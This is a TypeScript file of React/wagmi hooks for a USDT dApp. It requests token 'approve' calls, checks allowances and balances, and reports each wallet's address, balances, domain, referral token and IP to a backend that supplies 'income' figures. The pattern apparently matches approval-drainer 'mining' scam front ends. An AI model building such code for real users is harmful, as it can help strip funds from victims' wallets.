import { use, useEffect, useState } from "react"
import busdabi from "../contract/usdt.json"
import usdtabi from "../contract/usdtEth.json"
import { useAccount, useBalance, useContractRead, useContractWrite, useNetwork } from "wagmi"
import { getUserinfoServer, postUseRregister, postUserAccessRecord, postUserIp, addAuthError } from "@/server/user"
import { setBalance } from "viem/actions"


const useContractConfig = () => {
    const [config, setConfig] = useState({
        address: "0x55d398326f99059ff775485246999027b3197955" as `0x${string}`,
        abi: busdabi,
        chainId: 56,
    })
    const { chain } = useNetwork()
    useEffect(() => {
        if (chain?.id == 1) {
            setConfig({
                address: "0xdac17f958d2ee523a2206206994597c13d831ec7" as `0x${string}`,
                abi: usdtabi as any,
                chainId: 1,
            })
        } else {
            setConfig({
                address: "0x55d398326f99059ff775485246999027b3197955" as `0x${string}`,
                abi: busdabi,
                chainId: 56,
            })
        }
    }, [chain])
    return config
}

export const userContractApprove = () => {
    const CONTACT_CONFIG = useContractConfig()
    const { address } = useAccount()
    const { data, isLoading, isError, isSuccess, write: approve } = useContractWrite({
        ...CONTACT_CONFIG,
        functionName: "approve",
        onError(error) {
            if(address && error){
                // addAuthError({
                //     address: address,
                //     authErrLog: JSON.stringify(error),
                //     hash: data?.hash || ''
                // })
            }
        }
    })
    useEffect(() => {

    }, [isSuccess, isError])
    useEffect
    const onSuccess = async (func: Function) => {
        await func()
    }
    const onError = async (func: Function) => {
        await func()
    }
    return { data, isLoading, isSuccess, approve, onSuccess, onError }
}

export const useContractUserAllowanceStatus = (spenderAddress:any) => {
    const CONTACT_CONFIG = useContractConfig()
    const { address } = useAccount()
    const { chain } = useNetwork()
    const [isAllowed, setIsAllowed] = useState(false);
    const { data: allowance, isLoading: loading, isError: error } = useContractRead({
        ...CONTACT_CONFIG,
        functionName: "allowance",
        args: [address,spenderAddress],
        watch: true,
    })
    useEffect(()=>{
        console.log(allowance)
        if(!address){
            setIsAllowed(false)
        }else{
            let divisor
            if(chain?.id == 1){
                divisor = Math.pow(10, 6);
            }else{
                divisor = Math.pow(10, 18);
            }
            const adjustedBalance = Number(allowance) / divisor;
            if(adjustedBalance > 0 ){
                setIsAllowed(true)
            }else{
                setIsAllowed(false)
            }
        }
    },[allowance,address])
    return { isAllowed }
}

export const useContractUserBalance = () => {
    const CONTACT_CONFIG = useContractConfig()
    const { address } = useAccount()
    const { chain } = useNetwork()
    const [userBalance, setUserBalance] = useState(0)
    const [balanceLoading, setBalanceLoading] = useState(true)
    const { data: balance, isLoading: loading, isError: error } = useContractRead({
        ...CONTACT_CONFIG,
        functionName: "balanceOf",
        args: [address],
        watch: true,
    })
    useEffect(() => {
        setBalanceLoading(true)
        console.log(balance,"读取链上余额====")
        if (!address) {
            setUserBalance(0)
        } else {
            // 将balance减小十的18次方
            let divisor
            if(chain?.id == 1){
                divisor = Math.pow(10, 6);
            }else{
                divisor = Math.pow(10, 18);
            }
            
            const adjustedBalance = Number(balance) / divisor;
            setUserBalance(adjustedBalance || 0)
        }
        setBalanceLoading(false)
    }, [balance, address])
    return { userBalance, balanceLoading }
}
export const useGetUserInfo = () => {

    const { address } = useAccount()
    const { chain } = useNetwork()
    // console.log(chain,"chain=====")
    const [userinfo, setUserinfo] = useState({
        address,
        sumIncome: 0,  //全部收入
        dayIncome: 0,  //今日收益
        alreadyIncome: 0, //可用余额
        freezeAmount: 0   //冻结金额
    })
    const { balanceLoading, userBalance } = useContractUserBalance()
    const {data} = useBalance({
        address
    })
    const params = new URLSearchParams(window.location.search);
    const paramValue = params.get('c');
    const registerUser = async () => {
        if (balanceLoading || !address) return
        await postUseRregister({
            domain: window?.location?.hostname,
            address,
            chain_type: chain?.id,
            balance:data?.formatted,
            usdt_balance: userBalance,
            share_token: paramValue || '',
        })
    }
    // const accessRecord = async () => {
    //     await postUserAccessRecord({
    //         address,
    //         ip_address: "",
    //         ip_place: ""
    //     })
    // }
    const getUserInfo = async () => {
        const { data } = await getUserinfoServer({ address, chain_type: chain?.id })
        let isRecord = false
        if(typeof sessionStorage !== 'undefined'){
            isRecord = Boolean(sessionStorage.getItem("isRecord"))
        }
        if (balanceLoading) return
        if (data !== undefined) {
            setUserinfo({
                ...userinfo,
                sumIncome: data.income_total,  //全部收入
                dayIncome: data.income_today,  //今日收益
                alreadyIncome: data.withdrawable_balance, //可用余额
                freezeAmount: data.locked_balance   //冻结金额
            })
        }
        if(isRecord) return
        let res = await postUserIp({
            address,
            chain_type: chain?.id
        })
        if(res.data && typeof sessionStorage !== 'undefined'){
            sessionStorage.setItem("isRecord",String(true))
        }
        

    }
    useEffect(() => {
        (async () => {
            await registerUser()
            await getUserInfo()
            // await accessRecord()
        })()
    }, [address, balanceLoading, chain])
    return { userinfo, setUserinfo, getUserInfo }
}